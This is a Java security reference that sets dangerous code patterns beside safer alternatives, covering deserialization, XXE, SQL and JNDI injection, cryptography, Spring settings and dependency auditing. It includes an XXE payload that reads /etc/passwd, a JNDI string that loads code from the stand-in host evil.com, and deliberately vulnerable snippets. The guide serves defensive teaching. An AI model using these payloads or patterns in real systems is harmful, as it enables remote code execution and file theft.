# Java Security Reference

Java-specific vulnerability patterns and mitigations. Java's managed memory eliminates buffer overflows, but introduces its own vulnerability classes: deserialization attacks, XML external entities, JNDI injection, and reflection-based exploits.

---

## Deserialization

```java
// JAVA DESERIALIZATION IS DANGEROUS
// ObjectInputStream.readObject() can execute arbitrary code via gadget chains.
// This has produced some of the most critical Java CVEs (Apache Commons, Log4Shell-adjacent).

// DANGEROUS: deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(untrustedInput);
Object obj = ois.readObject();  // arbitrary code execution via gadget chains

// SAFE: never use Java serialization for untrusted input.
// Use data-only formats:
// - JSON (Jackson, Gson) with type validation
// - Protocol Buffers
// - MessagePack

// If you MUST use ObjectInputStream, use a filter (Java 9+):
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.SafeClass;!*"  // allowlist specific classes, deny all others
);
ois.setObjectInputFilter(filter);

// Jackson — safe by default but watch for polymorphic deserialization:
// DANGEROUS: enables arbitrary class instantiation
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  // attacker controls which class
public class Message { ... }

// SAFE: use explicit type allowlist
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonSubTypes({
    @JsonSubTypes.Type(value = TextMessage.class, name = "text"),
    @JsonSubTypes.Type(value = ImageMessage.class, name = "image"),
})
public abstract class Message { ... }

// Global defense: disable default typing in ObjectMapper
ObjectMapper mapper = new ObjectMapper();
// NEVER: mapper.enableDefaultTyping();
// NEVER: mapper.activateDefaultTyping(ptv, DefaultTyping.EVERYTHING);
```

## XML External Entities (XXE)

```java
// DANGEROUS: default XML parser configuration processes external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(untrustedXml);
// Attacker sends: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
// → reads arbitrary files from the server

// SAFE: disable external entities and DTDs
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Same for SAXParser, XMLReader, Transformer, SchemaFactory — disable external entities
// on every XML processor.

// SAFE: use JSON instead of XML when possible — no entity expansion attack surface
```

## SQL Injection

```java
// DANGEROUS: string concatenation
String query = "SELECT * FROM users WHERE name = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SAFE: PreparedStatement with parameters
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, username);
ResultSet rs = ps.executeQuery();

// SAFE: JPA/Hibernate — parameterized by default
User user = em.createQuery("SELECT u FROM User u WHERE u.name = :name", User.class)
    .setParameter("name", username)
    .getSingleResult();

// STILL DANGEROUS: string concatenation in JPQL/HQL
em.createQuery("SELECT u FROM User u WHERE u.name = '" + username + "'");

// SAFE: Spring Data JPA — parameterized
@Query("SELECT u FROM User u WHERE u.name = :name")
Optional<User> findByName(@Param("name") String name);

// SAFE: Criteria API — type-safe, no injection
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("name"), username));
```

## JNDI Injection (Log4Shell family)

```java
// Log4Shell (CVE-2021-44228) demonstrated JNDI injection via log messages.
// Any code that passes user input to JNDI lookup is vulnerable.

// DANGEROUS: user-controlled JNDI lookup
String userInput = request.getParameter("resource");
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(userInput);  // attacker sends "ldap://evil.com/exploit"

// DEFENSE:
// 1. Update Log4j to 2.17.1+ (or use Logback/SLF4J which aren't affected)
// 2. Set system property: -Dlog4j2.formatMsgNoLookups=true
// 3. Never pass user input to JNDI lookups
// 4. Restrict JNDI to local resources only (Java 8u191+ limits remote loading)

// General principle: never pass user input to any lookup/resolution mechanism
// that can load remote resources. This includes:
// - JNDI: InitialContext.lookup()
// - XSLT: TransformerFactory with user-controlled stylesheets
// - ScriptEngine: eval() with user input
// - ClassLoader: loading classes from user-controlled paths
```

## Secrets and Cryptography

```java
// RANDOM NUMBER GENERATION

// DANGEROUS: predictable RNG
Random rand = new Random();  // seeded from system time — predictable
int token = rand.nextInt();

// SAFE: cryptographically secure
SecureRandom secureRandom = new SecureRandom();
byte[] token = new byte[32];
secureRandom.nextBytes(token);
String tokenStr = Base64.getUrlEncoder().withoutPadding().encodeToString(token);


// PASSWORD HASHING — use bcrypt or argon2
// bcrypt (via jBCrypt or Spring Security)
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
var encoder = new BCryptPasswordEncoder(12);  // cost factor 12
String hash = encoder.encode(password);
boolean matches = encoder.matches(password, hash);

// DANGEROUS: unsalted/fast hashes
MessageDigest.getInstance("MD5").digest(password.getBytes());     // NO
MessageDigest.getInstance("SHA-256").digest(password.getBytes()); // NO — too fast


// CONSTANT-TIME COMPARISON
import java.security.MessageDigest;
boolean equal = MessageDigest.isEqual(provided.getBytes(), expected.getBytes());

// DANGEROUS: regular String.equals leaks timing
if (providedToken.equals(storedToken)) { ... }  // timing side-channel


// ENCRYPTION — use authenticated encryption
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;

// AES-GCM (authenticated encryption)
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
// NEVER: Cipher.getInstance("AES/ECB/PKCS5Padding") — ECB is insecure
// NEVER: Cipher.getInstance("DES/...") — DES is broken

// Generate a unique IV for each encryption operation
byte[] iv = new byte[12];
secureRandom.nextBytes(iv);
cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
byte[] ciphertext = cipher.doFinal(plaintext);
// Store iv + ciphertext together


// SECRETS IN CODE
// DANGEROUS:
private static final String DB_PASSWORD = "hunter2";  // in source control

// SAFE: external configuration
String dbPassword = System.getenv("DB_PASSWORD");

// BETTER: secret management
// AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager
// Spring Vault, or cloud provider SDK
```

## Web Security (Spring)

```java
// Spring Security handles many defaults well. Don't disable them.

// CSRF: enabled by default in Spring Security
// DANGEROUS: disabling CSRF without understanding implications
http.csrf().disable();  // only appropriate for stateless API with token auth

// CORS: restrict origins
@Bean
public CorsConfigurationSource corsConfig() {
    var config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com")); // NOT "*"
    config.setAllowedMethods(List.of("GET", "POST"));
    var source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}

// Security headers — Spring Security sets good defaults
// Verify these are present in responses:
// Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options,
// Content-Security-Policy, X-XSS-Protection

// SSRF prevention
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "api.example.com", "cdn.example.com"
);

public void fetchUrl(String userUrl) {
    URI uri = URI.create(userUrl);
    if (!"https".equals(uri.getScheme())) {
        throw new SecurityException("HTTPS required");
    }
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new SecurityException("Host not allowed");
    }
    // Also resolve and check for private IP ranges
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress()
            || addr.isLinkLocalAddress()) {
        throw new SecurityException("Private address blocked");
    }
}
```

## Dependency Auditing

```bash
# OWASP Dependency-Check (Gradle/Maven plugin)
# build.gradle:
# plugins { id 'org.owasp.dependencycheck' version '9.0.0' }
# gradle dependencyCheckAnalyze

# In CI: fail on CVSS >= 7
# dependencyCheck { failBuildOnCVSS = 7 }

# Gradle dependency locking (pin versions)
# gradle dependencies --write-locks

# Verify Gradle wrapper (prevent tampered wrapper attacks)
# gradle wrapper --verify

# GitHub Dependabot / Snyk / Renovate for automated CVE alerts

# Audit new dependencies before adding:
# - Who maintains it? How many maintainers?
# - When was the last release?
# - Does the scope match the need? (Does a JSON library need network access?)
# - Check for known CVEs in the National Vulnerability Database
```
